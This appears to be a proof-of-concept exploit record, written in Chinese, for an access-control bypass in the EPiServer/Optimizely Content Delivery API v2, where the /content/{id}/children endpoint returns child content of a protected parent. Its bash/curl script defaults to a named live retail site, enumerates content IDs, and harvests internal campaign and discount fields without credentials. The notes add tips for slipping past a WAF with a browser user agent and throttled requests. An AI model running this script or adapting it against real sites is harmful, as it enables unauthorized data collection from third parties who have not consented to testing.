# EPiServer Content Delivery API v2 /content/{id}/children 不继承父级 ACL → 匿名读取受保护根节点下的内部内容（营销活动/发行商折扣）

- **code**: episerver-cd-api-v2-children-acl-inheritance-bypass-unauth-c
- **kind**: poc
- **category**: unauthorized
- **component**: EPiServer CMS / Optimizely Content Delivery API v2.0（/api/episerver/v2.0）
- **severity**: low
- **language**: bash
- **source**: manual
- **verified**: 1
- **verified_note**: task#6 / finding_id=155（finding_checks.verdict=verified，findings.status=confirmed），2026-11-11 于 ARTEX 执行机用 curl 复测复核，全程无 Cookie / 无 Authorization：① GET https://www.greenmangaming.com/api/episerver/v2.0/content/5 → HTTP 403、56B {"error":{"code":"Forbidden","message":"Access denied"}}；② 同 id GET /content/5/children → HTTP 200、156226B、JSON 数组 145 条 GmgCampaignData（首条 id=210404「01/04/2016 Monday Merch」，含 validFrom/validUntil/isActive）；③ GET /content/210404/children → HTTP 200、28626B、26 条 PublisherDiscountType（样例 Banner Saga 2，publisherDiscountPercentage=10、priority=2300、isActive=true）；④ GET /content/1 → 403，而 /content/1/children → HTTP 200、725B（Headless Root，HeadlessRootType，status=Published）；⑤ /content/2|3|4/children → 200 [] 空数组（阴性对照，说明 200 不是网关兜底）。父级 403 / 子级 200 两组独立复现即判定成立；数据为 2016 年内部营销与折扣配置（无 PII、无凭据），故定 low，但同一不一致性可随新增内容类型放大。
- **path**: pocs/episerver-cd-api-v2-children-acl-inheritance-bypass-unauth-c/episerver_cd_children_acl_bypass.sh
- **tags**: episerver,optimizely,content-delivery-api,children,acl-bypass,unauthorized,403-bypass,content-enumeration,api-recon
- **created_at**: 2026-11-11T19:53:06.649Z
- **engine**: https://www.greenmangaming.com

## 描述

EPiServer（Optimizely）Content Delivery API v2 对「单条内容」与「子内容列表」的访问过滤不一致：被 ACL 保护的根节点单条 GET 恒 403 Access denied，但同 id 的 /content/{id}/children 匿名 200 返回完整子内容 JSON，且子项可继续按 id 下钻。属访问控制实现不一致导致的未授权读取，可用于匿名收割内部营销活动、折扣策略等内容模型数据。

## 用法

```
前置：目标启用 EPiServer/Optimizely CMS 的 Content Delivery API v2（默认前缀 /api/episerver/v2.0/），匿名可达；无需 Cookie/Authorization/XSRF；建议带浏览器 UA（裸 curl UA 可能被 CDN/WAF 直接 406/403）。

用法：T=https://<target> bash episerver_cd_children_acl_bypass.sh
脚本内 B 换成实际 API 前缀；ids 换成候选内容 id（1..N 顺序扫 /content/{id}/children 成本很低，空数组即跳过）。

三步判据（缺一不算命中）：
1) 单条 /content/{id} → 403（或该节点在正常前台不可见）；
2) 同 id /content/{id}/children → 200 且为 JSON 数组（非空）；
3) 取数组里的 contentLink.id 继续 /content/{childId}/children，能读出父级不可见字段（营销时间窗、isActive、折扣百分比、priority 等）。
注意 /content/{id}/children 返回 200 [] 是正常空节点，不是漏洞；404 表示未开 CD API 或前缀/版本不同（可试 /api/episerver/v3.0、或在站点 JS/HTML 里 grep "episerver"）。
```

## 正文

```
#!/usr/bin/env bash
# EPiServer Content Delivery API v2 —— 父级 ACL 不套用到 children 的未授权读取
# 用法: T=https://<target> [PREFIX=/api/episerver/v2.0] bash episerver_cd_children_acl_bypass.sh
# 全程只读，无需任何 Cookie / Authorization / XSRF。

set -u
T="${T:-https://www.greenmangaming.com}"
PREFIX="${PREFIX:-/api/episerver/v2.0}"
B="${T%/}${PREFIX}"
UA="${UA:-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36}"

req() { curl -sk --max-time 30 -A "$UA" -H 'Accept: application/json' \
        -o "$2" -w '%{http_code} %{size_download}' "$1"; }

echo "== 0. 指纹/探活 =="
code=$(req "$B/content/1" /tmp/epi_c1)
echo "GET /content/1 -> $code"
# 403 Access denied 或 200 JSON 均说明 CD API 存在；404 多半没开或前缀不同。

echo
echo "== 1. 阴性对照：受保护根节点单条 =="
code=$(req "$B/content/5" /tmp/epi_c5)
echo "GET /content/5 -> $code"
body5=$(cat /tmp/epi_c5)
echo "  body: ${body5:0:160}"

echo
echo "== 2. 命中：同 id 的 children 列表 =="
code=$(req "$B/content/5/children" /tmp/epi_c5kids)
echo "GET /content/5/children -> $code"
python3 - <<'PY'
import json
try:
    d = json.load(open('/tmp/epi_c5kids'))
except Exception as e:
    print('  not json:', e); raise SystemExit
if isinstance(d, list):
    print('  items:', len(d))
    for x in d[:3]:
        cl = x.get('contentLink') or {}
        print('  -', cl.get('id'), x.get('name'),
              x.get('contentType'),
              (x.get('validFrom') or {}).get('value'),
              'isActive=', (x.get('isActive') or {}).get('value'))
else:
    print('  body:', str(d)[:300])
PY

echo
echo "== 3. 逐级下钻：读子项明细（父级不可见的商务字段）=="
for id in $(python3 -c "import json;d=json.load(open('/tmp/epi_c5kids'));print(' '.join(str((x.get('contentLink') or {}).get('id')) for x in d[:3]) if isinstance(d,list) else '')" 2>/dev/null); do
  [ -z "$id" ] && continue
  code=$(req "$B/content/$id/children" "/tmp/epi_kids_$id")
  echo "GET /content/$id/children -> $code"
  python3 - "$id" <<'PY'
import json,sys
i=sys.argv[1]
try: d=json.load(open(f'/tmp/epi_kids_{i}'))
except Exception: raise SystemExit
if not isinstance(d,list): raise SystemExit
print('  items:',len(d))
for x in d[:3]:
    print('  -',x.get('name'),
          '| publisherDiscountPercentage=',(x.get('publisherDiscountPercentage') or {}).get('value'),
          '| gmgDiscountPercentage=',(x.get('gmgDiscountPercentage') or {}).get('value'),
          '| priority=',(x.get('priority') or {}).get('value'),
          '| isActive=',(x.get('isActive') or {}).get('value'))
PY
done

echo
echo "== 4. 第二个根节点复现（证明是通用实现问题，非单点）=="
code=$(req "$B/content/1" /tmp/epi_r1);  echo "GET /content/1 -> $code $(head -c 100 /tmp/epi_r1)"
code=$(req "$B/content/1/children" /tmp/epi_r1k); echo "GET /content/1/children -> $code"
python3 - <<'PY'
import json
try: d=json.load(open('/tmp/epi_r1k'))
except Exception: raise SystemExit
print('  items:',len(d) if isinstance(d,list) else 'n/a')
if isinstance(d,list):
    for x in d[:5]:
        cl=x.get('contentLink') or {}
        print('  -',cl.get('id'),x.get('name'),x.get('contentType'),x.get('status'))
PY

cat <<'EOF'

== 判定 ==
命中 = 受保护/前台不可见的父节点单条为 403（或不存在），但其 /children 返回 200 非空数组，
     且数组内 contentLink.id 可继续下钻取出内部字段（时间窗 / isActive / 折扣 / priority 等）。

常见失败原因：
- /content/{id}/children 也 403 → 实例已修复或该节点子级另有 ACL（换个根节点再试）。
- 200 但 body 为 [] → 该 id 就是空节点（如站点根下的 2/3/4），换 id。
- 404 → CD API 未启用 / 前缀不是 /api/episerver/v2.0（试 v3.0，或在页面 JS/HTML 里 grep episerver）。
- 401 → 实例要求 access token / scope（EPiServer CD API 可选鉴权）。
- 406 / 403 无 body → 边缘 WAF 按 UA 拦截，换浏览器 UA、降速（单线程、间隔 ≥1s）。

已确认的边界（不要浪费时间）：
- workId / epieditmode / preview 参数被忽略，读不到草稿版本。
- ?select=all 不增加字段；返回字段由内容类型固定的属性集决定。
- 无需任何凭据即可一直读到 Published 状态的子内容；2016 年的旧内容仍在线可读。
EOF
```
